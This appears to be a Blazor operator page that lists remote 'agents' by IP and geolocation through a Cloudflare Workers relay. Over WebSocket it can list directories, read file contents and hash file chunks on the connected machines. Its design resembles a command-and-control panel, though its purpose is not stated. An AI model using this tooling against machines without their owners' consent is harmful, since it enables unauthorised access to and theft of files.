@page "/command"
@inject HttpClient Http
@using System.Net.WebSockets
@using System.Text
@implements IAsyncDisposable

<PageTitle>Command</PageTitle>

<h1>Command</h1>

@if (error is not null)
{
    <div class="alert alert-danger">@error</div>
}

@if (!connected)
{
    <div class="card mb-3">
        <div class="card-body">
            <h5 class="card-title">Connect to Agent</h5>

            @if (agents is null)
            {
                <p><em>Loading agents...</em></p>
            }
            else if (agents.Length == 0)
            {
                <p><em>No agents connected.</em></p>
            }
            else
            {
                <div class="mb-3">
                    <label class="form-label">Select Agent</label>
                    <select class="form-select" @bind="selectedAgentId">
                        <option value="">-- Select --</option>
                        @foreach (var agent in agents)
                        {
                            <option value="@agent.Id">@agent.Id (@agent.Ip, @FormatLocation(agent))</option>
                        }
                    </select>
                </div>
                <button class="btn btn-primary" @onclick="Connect" disabled="@string.IsNullOrEmpty(selectedAgentId)">
                    Connect
                </button>
            }
        </div>
    </div>
}
else
{
    <div class="card mb-3">
        <div class="card-body d-flex justify-content-between align-items-center">
            <span>Connected to <code>@selectedAgentId</code></span>
            <button class="btn btn-outline-danger btn-sm" @onclick="Disconnect">Disconnect</button>
        </div>
    </div>

    <div class="card mb-3">
        <div class="card-body">
            <h5 class="card-title">Commands</h5>

            <div class="mb-3">
                <button class="btn btn-outline-primary me-2" @onclick="SendGetUUID" disabled="@sending">GetUUID</button>
            </div>

            <div class="mb-3">
                <label class="form-label">Path</label>
                <input class="form-control" @bind="commandPath" placeholder="C:\" />
            </div>

            <div class="d-flex gap-2 flex-wrap">
                <button class="btn btn-outline-primary" @onclick="SendGetDirectoryContent" disabled="@sending">GetDirectoryContent</button>

                <div class="d-flex align-items-center gap-2">
                    <button class="btn btn-outline-primary" @onclick="SendGetFileContent" disabled="@sending">GetFileContent</button>
                    <input class="form-control" style="width:120px" @bind="readCount" placeholder="Size" type="number" />
                    <input class="form-control" style="width:120px" @bind="fileOffset" placeholder="Offset" type="number" />
                </div>

                <div class="d-flex align-items-center gap-2">
                    <button class="btn btn-outline-primary" @onclick="SendGetFileChunkHash" disabled="@sending">GetFileChunkHash</button>
                    <input class="form-control" style="width:120px" @bind="chunkSize" placeholder="Chunk" type="number" />
                    <input class="form-control" style="width:120px" @bind="hashOffset" placeholder="Offset" type="number" />
                </div>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-body">
            <h5 class="card-title">Output</h5>
            <pre class="bg-dark text-light p-3 rounded" style="max-height:400px;overflow-y:auto;white-space:pre-wrap;">@output</pre>
        </div>
    </div>
}

@code {
    private ClientWebSocket? ws;
    private bool connected;
    private bool sending;
    private string? error;
    private string selectedAgentId = "";
    private string commandPath = @"C:\";
    private long readCount = 4096;
    private long fileOffset;
    private long chunkSize = 4096;
    private long hashOffset;
    private string output = "";
    private AgentConnection[]? agents;

    protected override async Task OnInitializedAsync()
    {
        await LoadAgents();
    }

    private async Task LoadAgents()
    {
        try
        {
            var status = await Http.GetFromJsonAsync<RelayStatus>("https://relay.nostdlib.workers.dev/");
            agents = status?.Agents?.Connections ?? [];
        }
        catch (Exception ex)
        {
            error = $"Failed to load agents: {ex.Message}";
        }
    }

    private async Task Connect()
    {
        try
        {
            error = null;
            ws = new ClientWebSocket();
            await ws.ConnectAsync(new Uri($"wss://relay.nostdlib.workers.dev/relay/{selectedAgentId}"), CancellationToken.None);
            connected = true;
            output = "Connected. Ready to send commands.\n";
        }
        catch (Exception ex)
        {
            error = $"Connection failed: {ex.Message}";
            ws?.Dispose();
            ws = null;
        }
    }

    private async Task Disconnect()
    {
        if (ws is not null)
        {
            try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
            ws.Dispose();
            ws = null;
        }
        connected = false;
        output = "";
    }

    private async Task SendGetUUID()
    {
        var payload = new byte[] { 0x00 };
        var response = await SendAndReceive(payload);
        if (response is null) return;

        if (response.Length >= 4)
        {
            var status = BitConverter.ToUInt32(response, 0);
            if (status == 0 && response.Length >= 20)
            {
                var uuid = new Guid(response.AsSpan(4, 16));
                output += $"UUID: {uuid}\n";
            }
            else
            {
                output += $"Error: status={status}\n";
            }
        }
    }

    private async Task SendGetDirectoryContent()
    {
        var payload = BuildPathCommand(0x01, commandPath);
        var response = await SendAndReceive(payload);
        if (response is null) return;

        if (response.Length >= 4)
        {
            var status = BitConverter.ToUInt32(response, 0);
            if (status != 0)
            {
                output += $"Error: status={status}\n";
                return;
            }

            if (response.Length >= 12)
            {
                var entryCount = BitConverter.ToUInt64(response, 4);
                output += $"Directory: {commandPath} ({entryCount} entries)\n";

                var offset = 12;
                for (ulong i = 0; i < entryCount && offset < response.Length; i++)
                {
                    var entry = ReadWideString(response, ref offset);
                    output += $"  {entry}\n";
                }
            }
        }
    }

    private async Task SendGetFileContent()
    {
        var pathBytes = Encoding.Unicode.GetBytes(commandPath + "\0");
        var payload = new byte[1 + 8 + 8 + pathBytes.Length];
        payload[0] = 0x02;
        BitConverter.TryWriteBytes(payload.AsSpan(1), (ulong)readCount);
        BitConverter.TryWriteBytes(payload.AsSpan(9), (ulong)fileOffset);
        pathBytes.CopyTo(payload, 17);

        var response = await SendAndReceive(payload);
        if (response is null) return;

        if (response.Length >= 4)
        {
            var status = BitConverter.ToUInt32(response, 0);
            if (status != 0)
            {
                output += $"Error: status={status}\n";
                return;
            }

            if (response.Length >= 12)
            {
                var bytesRead = BitConverter.ToUInt64(response, 4);
                var data = response.AsSpan(12, (int)Math.Min((int)bytesRead, response.Length - 12));
                try
                {
                    var text = Encoding.UTF8.GetString(data);
                    output += $"File: {commandPath} ({bytesRead} bytes)\n{text}\n";
                }
                catch
                {
                    output += $"File: {commandPath} ({bytesRead} bytes)\n{Convert.ToHexString(data)}\n";
                }
            }
        }
    }

    private async Task SendGetFileChunkHash()
    {
        var pathBytes = Encoding.Unicode.GetBytes(commandPath + "\0");
        var payload = new byte[1 + 8 + 8 + pathBytes.Length];
        payload[0] = 0x03;
        BitConverter.TryWriteBytes(payload.AsSpan(1), (ulong)chunkSize);
        BitConverter.TryWriteBytes(payload.AsSpan(9), (ulong)hashOffset);
        pathBytes.CopyTo(payload, 17);

        var response = await SendAndReceive(payload);
        if (response is null) return;

        if (response.Length >= 4)
        {
            var status = BitConverter.ToUInt32(response, 0);
            if (status != 0)
            {
                output += $"Error: status={status}\n";
                return;
            }

            if (response.Length >= 36)
            {
                var hash = Convert.ToHexString(response.AsSpan(4, 32));
                output += $"SHA-256: {hash}\n";
            }
        }
    }

    private byte[] BuildPathCommand(byte cmd, string path)
    {
        var pathBytes = Encoding.Unicode.GetBytes(path + "\0");
        var payload = new byte[1 + pathBytes.Length];
        payload[0] = cmd;
        pathBytes.CopyTo(payload, 1);
        return payload;
    }

    private async Task<byte[]?> SendAndReceive(byte[] payload)
    {
        if (ws is null || ws.State != WebSocketState.Open)
        {
            error = "Not connected";
            return null;
        }

        sending = true;
        StateHasChanged();

        try
        {
            await ws.SendAsync(payload, WebSocketMessageType.Binary, true, CancellationToken.None);

            var buffer = new byte[65536];
            using var ms = new MemoryStream();
            WebSocketReceiveResult result;
            do
            {
                result = await ws.ReceiveAsync(buffer, CancellationToken.None);
                ms.Write(buffer, 0, result.Count);
            } while (!result.EndOfMessage);

            error = null;
            return ms.ToArray();
        }
        catch (Exception ex)
        {
            error = $"Command failed: {ex.Message}";
            return null;
        }
        finally
        {
            sending = false;
            StateHasChanged();
        }
    }

    private static string ReadWideString(byte[] data, ref int offset)
    {
        var sb = new StringBuilder();
        while (offset + 1 < data.Length)
        {
            var ch = BitConverter.ToChar(data, offset);
            offset += 2;
            if (ch == '\0') break;
            sb.Append(ch);
        }
        return sb.ToString();
    }

    private static string FormatLocation(AgentConnection c)
    {
        var parts = new List<string>();
        if (!string.IsNullOrEmpty(c.City)) parts.Add(c.City);
        if (!string.IsNullOrEmpty(c.Country)) parts.Add(c.Country);
        return parts.Count > 0 ? string.Join(", ", parts) : "-";
    }

    public async ValueTask DisposeAsync()
    {
        if (ws is not null)
        {
            try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
            ws.Dispose();
        }
    }
}
